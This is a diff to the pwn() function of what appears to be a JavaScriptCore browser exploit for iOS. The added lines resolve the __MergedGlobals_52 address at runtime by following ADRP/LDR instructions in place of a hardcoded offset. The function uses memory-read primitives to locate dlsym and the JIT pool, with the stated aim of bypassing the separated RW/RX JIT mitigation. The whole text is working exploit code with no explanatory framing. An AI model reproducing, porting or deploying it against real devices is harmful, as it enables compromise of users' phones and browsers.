@@ -508,6 +508,13 @@ function pwn() {
     var mach_task_self_addr = find_symbol_address(libsystem_kernel_base, "__mach_task_self_");
     log(`[+] mach_task_self_: ${mach_task_self_addr}`);
 
+    var startOfFixedExecutableMemoryPoolImpl_addr = find_symbol_address(jsc_base, "___ZN3JSC36startOfFixedExecutableMemoryPoolImplEv");
+    log(`[+] startOfFixedExecutableMemoryPoolImpl: ${startOfFixedExecutableMemoryPoolImpl_addr}`);
+
+    var __MergedGlobals_52_addr = follow_adrpLdr(Add(jsc_base, startOfFixedExecutableMemoryPoolImpl_addr));
+    __MergedGlobals_52_addr = Sub(__MergedGlobals_52_addr, jsc_base);
+    log(`[+] __MergedGlobals_52: ${__MergedGlobals_52_addr}`);
+
     //fail
     // var __ZZ6dlopenE1p_addr = find_symbol_address(libdyld_base, "__ZZ6dlopenE1p");
     // log(`[+] __ZZ6dlopenE1p: ${__ZZ6dlopenE1p_addr}`);
@@ -518,7 +525,7 @@ function pwn() {
     var dlsym = Add(libdyld_base, dlsym_addr);
     
     // needed to bypass seperated RW, RX JIT mitigation
-    var __MergedGlobals_52 = read64(Add(jsc_base, offsets.__MergedGlobals_52));
+    var __MergedGlobals_52 = read64(Add(jsc_base, __MergedGlobals_52_addr));
     var memPoolStart = read64(Add(__MergedGlobals_52, offsets.memPoolStart));    //__MergedGlobals_52 + 0xc8
     var memPoolEnd = read64(Add(__MergedGlobals_52, offsets.memPoolEnd));      //__MergedGlobals_52 + 0xd0
     var jitWriteSeparateHeaps = read64(Add(jsc_base, jitWriteSeparateHeaps_addr));  //__ZN3JSC29jitWriteSeparateHeapsFunctionE
